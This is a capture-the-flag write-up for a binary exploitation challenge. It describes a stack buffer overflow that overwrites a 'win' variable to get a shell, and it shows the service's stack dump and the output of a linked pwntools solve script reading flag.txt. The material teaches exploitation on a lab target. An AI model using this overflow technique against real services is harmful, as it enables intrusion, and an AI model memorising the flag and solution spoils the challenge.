# Arturo Brachetti - Points: 50 - (Solves: 396)

**Category**: Binary Exploitation

**Description**: Connect to server with nc challenge.acictf.com 28923. Exploit
the service. Read the contents of flag.txt on the server. You can find the
source code here

**Hints**:
- Have you heard of buffer overflows?
- Change the value of win to get a shell

## Solution

Connecting to the provided service, it asks for input and dumps the stack. We
can see that our input is copied into a stack buffer, and we need to set `win`
to a special value to solve the challenge.

```
$ nc challenge.acictf.com 28923
You need to set win to 38684467
Enter your string: aaaaaaaaaaaaaaaa
0xffda023c: 08048705 (esp)
0xffda0238: ffda0298
0xffda023c: 08048705
0xffda0240: ffda0250
0xffda0244: 00000017
0xffda0248: ffda02a0
0xffda024c: f762f6bd
0xffda0250: 61616161
0xffda0254: 61616161
0xffda0258: 61616161
0xffda025c: 61616161
0xffda0260: ffda0300
0xffda0264: 0000047e
0xffda0268: 0000047e
0xffda026c: f7682330
0xffda0270: f77ab7eb
0xffda0274: 00000000
0xffda0278: f7782000
0xffda027c: ffda0314
0xffda0280: ffda0328
0xffda0284: f77b1ff0
0xffda0288: 00000001
0xffda028c: f7682300
0xffda0290: 0000047e
0xffda0294: f7682306
0xffda0298: ffda0328
0xffda029c: ffda0328 (ebp)
0xffda02a0: 08048815 (ret)
0xffda02a4: 00000000 (win)
win value (hex)  = 0
Sorry, you lose.
```

A quick check of the provided [source code](arturo.c) shows that if the `win`
parameter is set to 946357351, the program will drop us into a shell. A short
pwntools [script](solve.py) will yield the flag.`

```
$ ./solve.py
[+] Opening connection to challenge.acictf.com on port 28923: Done
[*] Switching to interactive mode
$ id
uid=1150(arturo-brachetti_2) gid=1151(arturo-brachetti_2)
groups=1151(arturo-brachetti_2)
$ ls -l
total 16
-rwxr-sr-x 1 hacksports arturo-brachetti_2 7808 Nov 30 15:33 arturo
-r--r----- 1 hacksports arturo-brachetti_2   54 Nov 30 15:33 flag.txt
-rwxr-sr-x 1 hacksports arturo-brachetti_2  121 Nov 30 15:33 xinet_startup.sh
$ cat flag.txt
ACI{remote_code_execution_is_best_execution_7ced1003}
```
